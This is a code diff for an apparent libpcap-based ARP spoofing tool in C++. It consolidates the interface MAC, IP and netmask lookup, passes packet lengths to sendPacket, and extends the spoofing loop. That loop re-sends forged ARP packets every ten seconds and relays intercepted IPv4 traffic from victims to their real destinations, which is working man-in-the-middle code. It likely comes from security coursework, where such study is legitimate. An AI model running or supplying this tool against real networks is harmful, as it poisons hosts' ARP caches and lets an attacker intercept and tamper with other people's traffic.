@@ -1,5 +1,7 @@
 #include "Packet.h"
 
+#define BUF_SIZE 256
+
 bool Packet::openLiveCapture(){
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
@@ -11,58 +13,47 @@ bool Packet::openLiveCapture(){
 }
 
 
-bool Packet::setMyInterfaceMac(){
+bool Packet::setMyInterfaceInfo() {
     struct ifreq ifr;
-    int sockfd, ret;
+    int sockfd;
 
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if(sockfd < 0) {
-        fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
+        fprintf(stderr, "Fail to get interface info - socket() failed - %m\n");
         return false;
     }
 
+    //Set my Interface Mac
+    memset(&ifr, 0, sizeof(ifr));
     strncpy(ifr.ifr_name, dev, IFNAMSIZ);
-    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
-    if (ret < 0) {
+    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
         fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
         close(sockfd);
         return false;
     }
     memcpy(interfaceMac, ifr.ifr_hwaddr.sa_data, ETH_ADDR_LEN);
-    close(sockfd);
 
-    return true;
-}
-
-
-bool Packet::setMyInterfaceIp(){
-    struct ifreq ifr;
-    int sockfd, ret;
-
-    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if(sockfd < 0) {
-        fprintf(stderr, "Fail to get interface IP address - socket() failed - %m\n");
-        return false;
-    }
-
+    //Set my Interface Ip
+    memset(&ifr, 0, sizeof(ifr));
     strncpy(ifr.ifr_name, dev, IFNAMSIZ);
-    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
-    if (ret < 0) {
+    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
         fprintf(stderr, "Fail to get interface IP address - ioctl(SIOCGIFADDR) failed - %m\n");
         close(sockfd);
         return false;
     }
-
     interfaceIp = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
+
+    //Set my Interface subnetMask
+    memset(&ifr, 0, sizeof(ifr));
+    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
+    if (ioctl(sockfd, SIOCGIFNETMASK, &ifr) < 0) {
+        fprintf(stderr, "Fail to get interface netmask - ioctl(SIOCGIFNETMASK) failed - %m\n");
+        close(sockfd);
+        return false;
+    }
+    interfaceSubnetMask = ((struct sockaddr_in *)&ifr.ifr_netmask)->sin_addr.s_addr;
+
     close(sockfd);
-
-    return true;
-}
-
-
-bool Packet::setMyInterfaceInfo(){
-    if (!setMyInterfaceMac()) return false;
-    if (!setMyInterfaceIp()) return false;
     return true;
 }
 
@@ -105,8 +96,8 @@ void Packet::sendPacket(){
 }
 
 
-void Packet::sendPacket(const u_char* packet){
-    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), sizeof(ethArpHdr));
+void Packet::sendPacket(const u_char* packet, u_int32_t packetLength){
+    int res = pcap_sendpacket(pcap, packet, packetLength);
     if (res != 0) {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
     }
@@ -120,6 +111,8 @@ packetInfo Packet::captureNextPacket(){
 
 
 void Packet::resolveMacByIp(u_int32_t ip){
+    //if ((interfaceIp && interfaceSubnetMask) != (ip && interfaceSubnetMask)) return;
+
     setEthHeader(interfaceMac, BROADCAST_MAC, ethHdr::ARP);
     setArpHeader(interfaceMac, interfaceIp, NULL_MAC, ip, arpHdr::ArpRequest);
     sendPacket();
@@ -164,7 +157,11 @@ void Packet::sendSpoofedPacket(u_int32_t senderIp, u_int32_t targetIp, u_int16_t
 
 
 void Packet::continuousArpSpoofing(){
-    while(true) {
+    time_t start_time, current_time;
+    double elapsed_time;
+    start_time = time(NULL);
+
+    while(true) {    
         packetInfo capturedPacketInfo = captureNextPacket();
         if (capturedPacketInfo.status == 0) continue;
         if (capturedPacketInfo.status == PCAP_ERROR || capturedPacketInfo.status == PCAP_ERROR_BREAK) {
@@ -174,30 +171,36 @@ void Packet::continuousArpSpoofing(){
 
         ethHdr* ethhdr = (ethHdr*)(capturedPacketInfo.packet);
         for (auto iter = senderTargetTable.begin(); iter != senderTargetTable.end(); iter++){
-            //When ARP packet
+            current_time = time(NULL);
+            elapsed_time = difftime(current_time, start_time);
+            if (elapsed_time >= 10) {
+                if (std::next(iter) == senderTargetTable.end()) start_time = current_time;
+                sendSpoofedPacket(iter->sender.ip, iter->target.ip, arpHdr::ArpRequest);
+            }
+
             if (ethhdr->ethType == htons(ethHdr::ARP)){
                 arpHdr* arphdr = (arpHdr*)(capturedPacketInfo.packet + ETH_HDR_LEN);
                 if (arphdr->srcIp == iter->sender.ip && arphdr->dstIp == iter->target.ip && arphdr->op == htons(arpHdr::ArpRequest)){
                     sendSpoofedPacket(arphdr->srcIp, arphdr->dstIp, arpHdr::ArpReply);
                     break;
                 }
-            }
-            //When IPv4 packet -> Send Relay Packet
-            else if (ethhdr->ethType == htons(ethHdr::IPv4)){
+            } else if (ethhdr->ethType == htons(ethHdr::IPv4)){
                 ipv4Hdr* ipv4hdr= (ipv4Hdr*)(capturedPacketInfo.packet + ETH_HDR_LEN);
                 if (ipv4hdr->srcIp == iter->sender.ip && ipv4hdr->dstIp != interfaceIp){
-                    if (arpTable.count(iter->target.ip) == 0) resolveMacByIp(iter->target.ip);
+                    if (arpTable.count(ipv4hdr->dstIp) == 0) resolveMacByIp(ipv4hdr->dstIp);
                     for (int i = 0; i < ETH_ADDR_LEN; i++){
                         ethhdr->srcMac[i] = interfaceMac[i];
-                        ethhdr->dstMac[i] = arpTable[iter->target.ip][i];
+                        ethhdr->dstMac[i] = arpTable[ipv4hdr->dstIp][i];
                     }
-                    sendPacket(capturedPacketInfo.packet);
+                    sendPacket(capturedPacketInfo.packet, capturedPacketInfo.header->len);
                     break;
                 }
             }
         }
     }
 }
+
+
 
 
 
